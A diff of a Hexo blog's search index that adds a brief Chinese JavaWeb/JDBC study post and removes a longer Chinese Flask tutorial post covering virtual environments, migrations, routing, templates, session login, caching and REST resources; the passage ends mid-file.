@@ -1,6 +1,22 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>java学习历程记录-JavaWeb</title>
+    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/</url>
+    <content><![CDATA[<p>最近开始了java的巩固学习，想着就是对着黑马去学习，首先学习的就是javaweb这个模块，所以也就去记录一些学习的历程。</p>
+<span id="more"></span>
+
+<h1 id="一、JDBC的使用"><a href="#一、JDBC的使用" class="headerlink" title="一、JDBC的使用"></a>一、JDBC的使用</h1><h2 id="1、JDBC是什么"><a href="#1、JDBC是什么" class="headerlink" title="1、JDBC是什么"></a>1、JDBC是什么</h2><p>JDBC就是去使用Java语言操作关系型数据库的一套API，从而达到去操作不同的各种数据库。</p>
+<p>java中并没有各种数据库的实现类，只有查询语句，而实现类是各个数据库厂家提供的jar包中实现的，这样就保证了JDBC能够实现对多种数据库的兼容性。</p>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>JavaWeb</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2023/11/06/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -19,513 +35,6 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>python学习经历-2-flask</title>
-    <url>/2023/11/13/python%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86-2-flask/</url>
-    <content><![CDATA[<p>接着之前的python进行学习，决定还是从更加实用点的项目相关的知识去学习，这样也可以去更好的实践当中去锻炼自己的能力，所以就选择了flask这个python中的轻量模块去学习。</p>
-<span id="more"></span>
-
-<h1 id="一、python中虚拟环境的使用"><a href="#一、python中虚拟环境的使用" class="headerlink" title="一、python中虚拟环境的使用"></a>一、python中虚拟环境的使用</h1><p>python是一个非常常见的编程语言，在python使用过程中，我们总是需要使用到很多需要自己安装下载的库，所以一般一个python编程人员的电脑上都有着许许多多的python库，而在我们去开发一些网站，程序相关的时候，我们并不需要去使用到我们所有的库，并且可能需要去使用某些特定版本的库，可这又应该怎么办？这个时候，虚拟环境也就因此诞生了。</p>
-<blockquote>
-<p>在使用Python语言时，通过pip（pip3）来安装第三方包，但是由于pip的特性，系统中只能安装每个包的一个版本。但是在实际项目开发中，不同项目可能需要第三方包的不同版本，迫使我们需要根据实际需求不断进行更新或卸载相应的包，而如果我们直接使用本地的Python环境，会导致整体的开发环境相当混乱而不易管理，这时候我们就需要开辟一个独立干净的空间进行开发和部署，虚拟环境就孕育而生。</p>
-</blockquote>
-<p>下面就直接去记录一下一些虚拟环境的常见使用方法，最流行的就是Virtualenv这个虚拟环境的配置工具</p>
-<p>安装：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install virtualenv virtualenvwrapper-win  //windows环境下</span><br></pre></td></tr></table></figure>
-
-<p>查看虚拟环境有哪些</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure>
-
-<p>创建一个新的虚拟环境</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mkvirtualenv 虚拟环境名</span><br></pre></td></tr></table></figure>
-
-<p>去使用一个虚拟环境</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon 虚拟环境名</span><br></pre></td></tr></table></figure>
-
-<p>注意：虚拟环境文件默认在C盘中用户下中的env中</p>
-<h1 id="二、数据库中的数据迁移操作"><a href="#二、数据库中的数据迁移操作" class="headerlink" title="二、数据库中的数据迁移操作"></a>二、数据库中的数据迁移操作</h1><p>数据库首先先初始化连接设置</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">db_uri = <span class="string">&#x27;mysql+pymysql://root:password@localhost:3306/bookdb&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = db_uri</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
-
-<p>其次就是模块类的创建，也就相当于数据库中的列</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;tb_user&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer, default=<span class="number">1</span>)</span><br><span class="line">    sex = db.Column(db.Boolean, default=<span class="literal">True</span>)</span><br><span class="line">    salary = db.Column(db.Float, default=<span class="number">10000</span>, nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<p>为什么要做数据迁移呢？在我的理解中这就相当于一个空白数据库的初始化，将创建的类中的列添加到数据库之中，其实就是相当于我们去创建各个字段的过程。</p>
-<p>下面就是用到的命令</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">flask db init   //创建迁移文件夹migrates，只调用一次</span><br><span class="line">flask db migrate //生成迁移文件</span><br><span class="line">flask db upgrade  //执行迁移文件中的升级</span><br><span class="line">flask db downgrade  //执行迁移文件中的降级</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、flask框架中的一些基本操作以及示例"><a href="#三、flask框架中的一些基本操作以及示例" class="headerlink" title="三、flask框架中的一些基本操作以及示例"></a>三、flask框架中的一些基本操作以及示例</h1><h2 id="1、最基础的单文件框架"><a href="#1、最基础的单文件框架" class="headerlink" title="1、最基础的单文件框架"></a>1、最基础的单文件框架</h2><p>文件结构：</p>
-<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/4e67729456c911aa9646284ff32250ab--24ca--image-20231119174414920.png" alt="image-20231119174414920"></p>
-<blockquote>
-<p>static: 静态文件文件夹，用于存放一些像是css，js，image，font等的文件。</p>
-<p>templates：用于存放html网站文件</p>
-</blockquote>
-<p>app.py:（主项目文件）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>) </span><span class="comment">#路由的注册</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello index!&#x27;</span>  <span class="comment">#页面显示的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
-
-<p><strong>app运行的时候一些可选的参数：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-<th>默认值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>debug</td>
-<td>代码更新是否自动重启</td>
-<td>False</td>
-</tr>
-<tr>
-<td>theaded</td>
-<td>是否开启多线程</td>
-<td>False</td>
-</tr>
-<tr>
-<td>port</td>
-<td>指定端口</td>
-<td>5000</td>
-</tr>
-<tr>
-<td>host</td>
-<td>指定主机（设置0.0.0.0可以通过本地IP访问）</td>
-<td>127.0.0.1</td>
-</tr>
-</tbody></table>
-<p>一般项目开发时都会开启debug模式</p>
-<h2 id="2、简单的模板渲染"><a href="#2、简单的模板渲染" class="headerlink" title="2、简单的模板渲染"></a>2、简单的模板渲染</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">render_template()  <span class="comment">#可以返回一个渲染的html页面</span></span><br></pre></td></tr></table></figure>
-
-<p>示例：</p>
-<p>app.py</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=<span class="string">&quot;法外狂徒张三&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-
-<p>index.html</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>index<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>name: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以利用render_template去将后端的一些数据返回到前端，然后再使用去使用传递过来的参数</p>
-<h2 id="3、对文件结构进行进行拆分"><a href="#3、对文件结构进行进行拆分" class="headerlink" title="3、对文件结构进行进行拆分"></a>3、对文件结构进行进行拆分</h2><p>文件结构：</p>
-<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/137d93a1d65364fb1dee979682c5fa2a--6af8--image-20231119182749925.png" alt="image-20231119182749925"></p>
-<p>将除了主文件的其他文件都移入一个单独创建的App文件夹当中。</p>
-<blockquote>
-<p>init.py：初始化的文件，在这里我们将app的创建函数放入其中，待需要使用时导入即可</p>
-<p>models.py：模板文件，后边主要用于数据库方面的操作</p>
-<p>views.py：视图函数的存放，也就是存放各种路由的地方</p>
-</blockquote>
-<p>为了方便视图函数的使用，使用蓝图去绑定</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.register_blueprint(blueprint=blue)</span><br></pre></td></tr></table></figure>
-
-<p>将app绑定在blue上，这样之后路由就可以这样去使用了</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="4、简易登录界面的实现"><a href="#4、简易登录界面的实现" class="headerlink" title="4、简易登录界面的实现"></a>4、简易登录界面的实现</h2><h3 id="①cookie的一些设置"><a href="#①cookie的一些设置" class="headerlink" title="①cookie的一些设置"></a>①cookie的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">response = redirect(<span class="string">&#x27;/home/&#x27;</span>) <span class="comment">#重定向，用于登录后界面的跳转</span></span><br><span class="line"></span><br><span class="line">response.set_cookie(<span class="string">&#x27;user&#x27;</span>, username, max_age=<span class="number">3600</span>*<span class="number">24</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
-
-<p>可以直接通过set__cookie去设置一个json格式的cookie</p>
-<h3 id="②session的一些设置"><a href="#②session的一些设置" class="headerlink" title="②session的一些设置"></a>②session的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>将app的配置文件中的SECRET_KEY修改为不空的值，并且将这个作为密匙去加密</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line"></span><br><span class="line">session.permanent = <span class="literal">True</span>  <span class="comment">#默认是false，关闭浏览器后就清空session</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="③实现"><a href="#③实现" class="headerlink" title="③实现"></a>③实现</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, redirect, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">blue = Blueprint(<span class="string">&#x27;user&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;home.html&#x27;</span>, username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)   <span class="comment">#获取传递过来的参数</span></span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">            response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># response.set_cookie(&#x27;user&#x27;, username, max_age=3600*24*7)</span></span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line">            session.permanent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;用户名或密码错误！&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/string/&lt;string:name&gt;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment"># def get_string(name):</span></span><br><span class="line"><span class="comment">#     print(type(name))</span></span><br><span class="line"><span class="comment">#     return name</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/redirect/&#x27;)</span></span><br><span class="line"><span class="comment"># def make_redirect():</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return redirect(&#x27;https://www.qq.com&#x27;)</span></span><br></pre></td></tr></table></figure>
-
-<p>在自己设计一个前段登入即可</p>
-<p>示例：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="5、路由参数"><a href="#5、路由参数" class="headerlink" title="5、路由参数"></a>5、路由参数</h2><blockquote>
-<p>string  接收如何没有斜杠(‘&#x2F;‘)的字符串(默认)</p>
-<p>int  接收整型</p>
-<p>float   接收浮点型</p>
-<p>path  接收路径，可接收斜线(‘&#x2F;‘)</p>
-<p>uuid   只接受uuid字符串，唯一码，一种生成规律（uuid是一段特定的字符串，基本无法伪造）</p>
-<p>any   可以同时指定多种路径，进行限定</p>
-</blockquote>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/any/&lt;any(apple, orange, banana):fruit&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_any</span>(<span class="params">fruit</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(fruit))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(fruit)</span><br></pre></td></tr></table></figure>
-
-<p>any表示限定只能在给定的之中选择</p>
-<h2 id="6、路由请求方法的指定"><a href="#6、路由请求方法的指定" class="headerlink" title="6、路由请求方法的指定"></a>6、路由请求方法的指定</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure>
-
-<p>设置该路由可以由GET和POST这两种请求方法区访问</p>
-<p>一些最常见的请求方式</p>
-<blockquote>
-<p>GET</p>
-<p>POST</p>
-<p>PUT</p>
-<p>DELETE</p>
-</blockquote>
-<h1 id="四、flask中四个全局变量"><a href="#四、flask中四个全局变量" class="headerlink" title="四、flask中四个全局变量"></a>四、flask中四个全局变量</h1><p>**</p>
-<table>
-<thead>
-<tr>
-<th><strong>变量</strong></th>
-<th><strong>上下文</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>current_app</td>
-<td>应用上下文</td>
-<td>相当与在主程序中激活的实例化app（<code>app=Flask(__name__)</code>）</td>
-</tr>
-<tr>
-<td>g</td>
-<td>应用上下文</td>
-<td>一次性函数，处理请求的临时变量。只在一个请求中被应用，下个请求开始时会自动重置</td>
-</tr>
-<tr>
-<td>request</td>
-<td>请求上下文</td>
-<td>请求对象。存放了客户端发来的HTTP信息</td>
-</tr>
-<tr>
-<td>session</td>
-<td>请求上下文</td>
-<td>记录用户和服务器之间的会话的。在服务器端记录需要记住的信息。（和cookie对应，cookies是记录在客户端的）</td>
-</tr>
-</tbody></table>
-<p><strong>request中的一些用法:</strong></p>
-<blockquote>
-<p>url   完整请求地址</p>
-<p>base_url   去掉GET参数的URL</p>
-<p>host_url   只有主机和端口号的URL</p>
-<p>path  路由中的路径</p>
-<p>method 请求方式</p>
-<p>remote_addr  请求的客户端地址</p>
-<p>args   GET请求参数</p>
-<p>form   POST请求参数</p>
-<p>files   文件上传</p>
-<p>headers  请求头</p>
-<p>cookies   请求头中的cookie</p>
-</blockquote>
-<h1 id="五、钩子函数装饰器"><a href="#五、钩子函数装饰器" class="headerlink" title="五、钩子函数装饰器"></a>五、钩子函数装饰器</h1><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>before_first_request</td>
-<td>处理第一次请求之前</td>
-</tr>
-<tr>
-<td>before_request</td>
-<td>在每次请求之前，通常利用这个处理一些变量，实现反爬</td>
-</tr>
-<tr>
-<td>app.after_request</td>
-<td>注册一个函数，如果没有未处理的异常抛出，每次请求结束后运行</td>
-</tr>
-<tr>
-<td>app.teardown_request</td>
-<td>有异常也会运行，每次请求结束后。当APP上下文被移除后执行的函数，可以进行数据库的提交和回滚</td>
-</tr>
-</tbody></table>
-<p>使用示例：</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h1 id="六、Flask的一些插件的使用"><a href="#六、Flask的一些插件的使用" class="headerlink" title="六、Flask的一些插件的使用"></a>六、Flask的一些插件的使用</h1><h2 id="1、flask-caching"><a href="#1、flask-caching" class="headerlink" title="1、flask-caching"></a>1、flask-caching</h2><p>安装</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install flask-caching</span><br></pre></td></tr></table></figure>
-
-<p>初始化</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cache = Cache(config=&#123;</span><br><span class="line">    <span class="string">&#x27;CACHE_TYPE&#x27;</span>: <span class="string">&#x27;simple&#x27;</span>  <span class="comment">#缓存类型</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>添加缓存</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@cache.cached(<span class="params">timeout=<span class="number">20</span></span>)   </span><span class="comment">#使缓存存在20秒</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;index2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(g.star)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index2&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>对反爬的相关应用</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(request.path)</span><br><span class="line">    <span class="built_in">print</span>(request.method)</span><br><span class="line">    <span class="built_in">print</span>(request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#简单的反爬</span></span><br><span class="line">    <span class="built_in">print</span>(request.user_agent)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> request.user_agent.string:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;您正在使用python爬虫，再见！&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#针对ip作反爬</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> cache.get(ip):</span><br><span class="line">        <span class="comment">#做了个拦截，不会进入视图函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;小伙子，别爬了！&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#对每个ip设置一个缓存，1秒内不让重复访问</span></span><br><span class="line">        cache.<span class="built_in">set</span>(ip, <span class="string">&#x27;value&#x27;</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<h1 id="七、前后端分离模式"><a href="#七、前后端分离模式" class="headerlink" title="七、前后端分离模式"></a>七、前后端分离模式</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/7a211a47e9bdbf3195d69d8b36829d3b--ad35--image-20231119204503992.png" alt="image-20231119204503992"></p>
-<p>将原本的views拆分为urls和apis。</p>
-<p>urls.py</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  路由文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> api</span><br><span class="line"><span class="keyword">from</span> .apis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">api.add_resource(HelloResource, <span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">api.add_resource(UserResource, <span class="string">&#x27;/user/&#x27;</span>, endpoint=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">api.add_resource(User2Resource, <span class="string">&#x27;/user2/&#x27;</span>)</span><br><span class="line">api.add_resource(User4Resource, <span class="string">&#x27;/user4/&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>apis.py</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask_restful <span class="keyword">import</span> Resource, fields, marshal_with, reqparse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类视图  CBV</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloResource</span>(<span class="title class_ inherited__">Resource</span>):   <span class="comment">#必须要继承Resource</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;get请求&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        <span 